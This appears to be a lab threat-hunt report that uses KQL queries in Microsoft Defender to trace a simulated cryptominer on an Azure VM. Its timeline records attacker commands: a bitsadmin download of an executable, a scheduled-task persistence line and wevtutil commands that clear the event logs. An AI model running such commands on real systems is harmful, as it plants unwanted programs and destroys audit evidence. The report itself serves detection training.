# Threat Hunt Report (Unauthorized Cryptominer Usage)
**Detection of Unauthorized Cryptominer Installation and Use**

---

## Platforms and Languages Leveraged
- Windows 10 Virtual Machines (Microsoft Azure)
- EDR Platform: Microsoft Defender for Endpoint
- Kusto Query Language (KQL)

---

## Scenario:
A sudden spike in CPU and memory usage was observed on a Windows 10 endpoint in Azure. Management suspects illicit cryptomining activity and wants to proactively hunt for any cryptominer-related files or processes that may be running undetected.

---

## High-Level Cryptominer IoC Discovery Plan:
1. Check **DeviceFileEvents** for cryptominer related files (or suspicious renames) and any stealthy utilities (e.g., `bitsadmin.exe`).
2. Check **DeviceProcessEvents** for cryptominer execution or processes configuring persistence (e.g., `schtasks.exe`).
3. Check **DeviceNetworkEvents** for connections to known mining pools or suspicious outbound ports.
4. Review **DeviceRegistryEvents** for unauthorized Run/RunOnce entries referencing miner executables.

---

## Steps Taken

### 1. Searched the `DeviceFileEvents` table for downloaded files

Searched for any instances of cryptomining related files being downloaded onto the `cmh-cyber-vm` device and discovered that at `2025-03-09T17:34:20.1108818Z`, the user `cmh-cyber` had initiated the download of `fake-miner.exe` to `C:\Users\cmh-cyber\AppData\Local\Temp`. At `2025-03-09T17:41:05.7333922Z`, there's evidence that the `fake-miner.exe` file had been renamed to `systemupdate.exe` in an attempt to bypass signature based detection methods and blend in with normal system activity.

**Queries used to locate event:**

```kql
DeviceFileEvents
| where DeviceName == "cmh-cyber-vm"
| where FileName endswith ".exe" and FileName contains "miner"
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessAccountName
```

<img width="1270" alt="CleanShot 2025-03-09 at 16 38 06@2x" src="https://github.com/user-attachments/assets/571ed0ff-28ad-4119-be3b-7fae76c4d7dd" />

<img width="1270" alt="CleanShot 2025-03-09 at 16 38 56@2x" src="https://github.com/user-attachments/assets/69c23b3c-f045-4ea5-9d72-9a30b2ec7b0e" />

```kql
DeviceFileEvents
| where DeviceName == "cmh-cyber-vm"
| where Timestamp >= datetime('2025-03-09T17:41:05.7333922Z')
| where FileName endswith ".exe"
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessAccountName
```

<img width="1270" alt="CleanShot 2025-03-09 at 16 43 49@2x" src="https://github.com/user-attachments/assets/a04fb267-eebe-4a49-9e53-2097d4084125" />

---

### 2. Searched the `DeviceProcessEvents` table for cryptomining activity

Digging further into the `DeviceProcessEvents` table, the first thing that's observed is that the user `cmh-cyber` utilized `bitsadmin.exe` as a download method in an attempt to avoid detection and bypass any security restrictions that may have blocked the cryptominer from being downloaded in the first place. At `2025-03-09T19:27:55.2679055Z`, the user `cmh-cyber` had initiated the cryptominer by starting the `systemudpate.exe` process. The user `cmh-cyber` then continues to establish persistence through a `schtask` command that configured a schedule task to execute `systemupdate.exe` every time a logon event is encountered.

**Queries used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName == "cmh-cyber-vm"
| where ProcessCommandLine contains "fake-miner.exe"
| project Timestamp, DeviceName, AccountName, ActionType, ProcessCommandLine
```

<img width="1270" alt="CleanShot 2025-03-09 at 17 12 15@2x" src="https://github.com/user-attachments/assets/d704de81-90d6-4aca-9d9f-59af9faa62cf" />

```kql
DeviceProcessEvents
| where DeviceName == "cmh-cyber-vm"
| where ProcessCommandLine contains "systemupdate.exe"
| project Timestamp, DeviceName, AccountName, ActionType, FileName, ProcessCommandLine, InitiatingProcessFileName
```

<img width="1270" alt="CleanShot 2025-03-09 at 17 13 23@2x" src="https://github.com/user-attachments/assets/49591e6b-b1e0-4120-b71d-ec85ce610e59" />

<img width="1270" alt="CleanShot 2025-03-09 at 17 14 40@2x" src="https://github.com/user-attachments/assets/e0e07445-1563-480c-9571-658aff7f753b" />

---

### 3. Searched the `DeviceNetworkEvents` for outbound connections related to the cryptominer.

At `2025-03-10T02:11:48.1390195Z`, a outbound connection was made to `192.168.1.100` on port `3333`. This connection was initiated by `systemupdate.exe` which suggests that this connection was being directed at the cryptominer's mining pool.

**Query used to locate event:**

```kql
DeviceNetworkEvents
| where DeviceName == "cmh-cyber-vm"
| where InitiatingProcessFileName endswith ".exe"
| where InitiatingProcessCommandLine has_any ("miner", "systemupdate")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemotePort
```

<img width="1270" alt="CleanShot 2025-03-09 at 21 17 30@2x" src="https://github.com/user-attachments/assets/4860f781-905a-443e-9509-55cb9d575d01" />

---

### 4. Searched the `DeviceRegistryEvents` to check if the cryptominer had created a registry Run key or similar.

The detection of a registry modification event (persistence via the Run or RunOnce registry keys) was detected on the device `cmh-cyber-vm` at `2025-03-10T02:11:27.0935942Z`, where the `FakeMiner` registry key was created under `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`. The registry value persistence mechanism points to the executable `systemupdate.exe`.

**Query used to locate event:**

```kql
DeviceRegistryEvents
| where DeviceName == "cmh-cyber-vm"
| where RegistryKey endswith "Run" or RegistryKey endswith "RunOnce"
| where RegistryValueData has_any ("miner.exe", "systemupdate.exe")
| project Timestamp, DeviceName, ActionType, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessAccountName
```

<img width="1270" alt="CleanShot 2025-03-09 at 21 19 04@2x" src="https://github.com/user-attachments/assets/f1b53f63-a188-4cc8-b7c8-b55a3211e6a4" />

---

### 5. Searched the `DeviceProcessEvents` to find any anti-forensics activity

Searching for High `ProcessIntegrityLevel` events after the registry modification event at `2025-03-10T02:11:27.0935942Z` reveals three `wevtutil` commands intiated by the user `cmh-cyber` at `2025-03-10T02:14:24.1643258Z`, `2025-03-10T02:14:32.2637847Z` and `2025-03-10T02:14:09.8833781Z` respectively which successfully cleared the Application, Security and System event logs. This behavior is associated with anti-forensic techniques used to cover tracks after unauthorized activities, such as malware execution or persistence setup.

**Query used to locate event:**

```kql
DeviceProcessEvents
| where DeviceName == "cmh-cyber-vm"
| where Timestamp >= datetime('2025-03-10T02:11:27.0935942Z')
| where ProcessIntegrityLevel == "High"
| project Timestamp, DeviceName, FileName, ProcessCommandLine, AccountName, ProcessIntegrityLevel
```

<img width="1261" alt="CleanShot 2025-03-09 at 21 48 29@2x" src="https://github.com/user-attachments/assets/acf1032a-0a4f-4533-b193-158ffef3f2ac" />

---

## Chronological Events

### 1. File Download - Cryptominer via bitsadmin 
   - Timestamp: `2025-03-09T17:34:20.1108818Z`
   - Event:  File `fake-miner.exe` downloaded from a GitHub URL to `C:\Users\cmh-cyber\`
   - Action: File download detected.
   - Filepath: `C:\Users\cmh-cyber\fake-miner.exe`
   - Command: `bitsadmin  /transfer "Download" /priority normal https://github.com/clayhickman/portfolio/raw/refs/heads/main/threat-hunting-scenarios/cryptominer/fake-miner.exe "C:\Users\cmh-cyber\AppData\Local\Temp\fake-miner.exe"`


### 2. File Creation - File Renamed
   - Timestamp: `2025-03-09T17:41:05.7333922Z`
   - Event: `fake-miner.exe` renamed to `systemupdate.exe`
   - Action: File rename detected.
   - Filepath: `C:\Users\cmh-cyber\systemupdate.exe`

### 3. Process Execution - Cryptominer Execution and Scheduled Task Creation* 
   - Timestamps:
      - `2025-03-09T19:27:55.2679055Z` - `systemupdate.exe` executed.
      - `2025-03-09T19:36:39.3797145Z` - `schtasks.exe` set up.
   - Event: `systemupdate.exe` was executed, followed by a `schtasks.exe` command to set up persistence triggered on user logon.
   - Action: Process execution detected.
   - Command:  `schtasks /create /tn SystemUpdate /tr C:\Users\cmh-cyber\AppData\Local\Temp\systemupdate.exe /sc onlogon`


### 4. Network Activity - Outbound Connection 
   - Timestamp: `2025-03-10T02:11:48.1390195Z`
   - Event: Outbound network connections were made to a mining pool at `192.168.1.100:3333`.
   - Action: Connection successful.

### 5. Persistence - Registery Key Modification 
   - Timestamp: `2025-03-10T02:11:27.0935942Z`
   - Event: A registery key modification is made to establish persistence via the Run or RunOnce Registry Keys
   - Action: ... 

### 5. Anti-Forensics - Removal of Logs
   - Timestamps:
      - `2025-03-10T02:14:24.1643258Z` - `Application`
      - `2025-03-10T02:14:32.2637847Z` - `Security`
      - `2025-03-10T02:14:09.8833781Z` - `System`
   - Event: Event logs cleared via `wevtutil`.
   - Action: Log deletion detected.
   - Commands:
     - `wevtutil cl Applcation`
     - `wevtutil cl Security`
     - `wevtutil cl System`

---

## Summary
Our threat hunt confirmed an unauthorized cryptominer was installed and actively running on the device `cmh-cyber-vm`. The user `cmh-cyber` used `bitsadmin.exe` to download the miner, renamed it to `systemupdate.exe`, and set up persistence using Windows `Scheduled Tasks`. The cryptominer established connections to an external mining pool at `192.168.1.100:3333`, causing elevated CPU usage and unusual network traffic. Once the intial set up was completed, the user `cmh-cyber` conducted a series of anti-forensic actions to cover their tracks.

---

## Response Taken
The affected endpoint `cmh-cyber-vm` was isolated from the network to prevent further resource abuse or spread. The suspicious executable `systemupdate.exe` was quarantined and removed. Additional blocking rules and stricter policies on the use of `bitsadmin.exe` were implemented. Management was notified, and a full environmental review to identify any lateral movement or secondary infections is recommended as the next course of action.

---

## Created By:
- **Author Name**: Clay Hickman  
- **Author Contact**: [LinkedIn](https://www.linkedin.com/in/clay-h-980ba5262)  
- **Date**: March 09, 2025

## Validated By:
- **Reviewer Name**:  
- **Reviewer Contact**:  
- **Validation Date**:  

---

## Revision History:
| **Version** | **Changes**                    | **Date**         | **Modified By**   |
|-------------|--------------------------------|------------------|-------------------|
| 1.0         | Initial draft                  | `March 09, 2025` | `Clay Hickman`    |
